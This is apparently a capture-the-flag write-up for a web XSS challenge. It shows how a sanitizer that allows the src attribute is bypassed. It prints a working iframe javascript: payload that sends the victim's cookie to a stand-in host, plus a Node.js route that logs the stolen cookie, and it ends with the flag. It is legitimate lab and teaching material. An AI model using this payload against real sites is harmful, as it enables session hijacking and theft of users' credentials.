<h1>static-static-hosting</h1>

<p>Author: <a href="https://github.com/roerohan">roerohan</a></p>

<p>This is another XSS challenge, similar to <a href="../static-pastebin">this</a> one.</p>

<h1>Requirements</h1>

<ul>
<li>Basic knowledge of XSS.</li>
<li>Server with SSL to accept a request.</li>
</ul>

<h1>Source</h1>

<ul>
<li>https://static-static-hosting.2020.redpwnc.tf/</li>
</ul>

<h1>Exploitation</h1>

<p>This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. Similar to <a href="../static-pastebin">static-pastebin</a>, the URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the <code>js</code> in the source.</p>

<p>```javascript
(async () =&gt; {
    await new Promise((resolve) =&gt; {
        window.addEventListener('load', resolve);
    });</p>

<pre><code>const content = window.location.hash.substring(1);
display(atob(content));
</code></pre>

<p>})();</p>

<p>function display(input) {
    document.documentElement.innerHTML = clean(input);
}</p>

<p>function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;</p>

<pre><code>sanitize(html);

const result = html.innerHTML;
return result;
</code></pre>

<p>}</p>

<p>function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i &lt; attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }</p>

<pre><code>const children = element.children;
for (let i = 0; i &lt; children.length; i++) {
    if (children[i].nodeName === 'SCRIPT') {
        element.removeChild(children[i]);
        i --;
    } else {
        sanitize(children[i]);
    }
}
</code></pre>

<p>}
```</p>

<p>The main thing we notice is that it prevents <code>script</code> tags and it allows only the following attributes for an element: <code>'src', 'width', 'height', 'alt', 'class'</code>. So we have to perform an XSS with these attributes. So, here's the payload.</p>

<p>```</p>

<iframe src="javascript:document.location='https://myserver.tld?cookie='+document.cookie"></iframe>

<p>````</p>

<p>Note that here, the site is supposed to be <code>https</code>, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:</p>

<p><code>
https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbXlzZXJ2ZXIudGxkP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSI+PC9pZnJhbWU+
</code></p>

<p>On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it.</p>

<p><code>javascript
router.get('/cookie', (req, res) =&gt; {
    console.log(req.query.cookie);
}
</code></p>

<p>When the link for the website is sent to the <code>admin bot</code>, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at <code>myserver.tld</code>. The cookie stores the <code>flag</code>.
<br /></p>

<p>The flag is:</p>

<p><code>
flag{wh0_n33d5_d0mpur1fy}
</code></p>
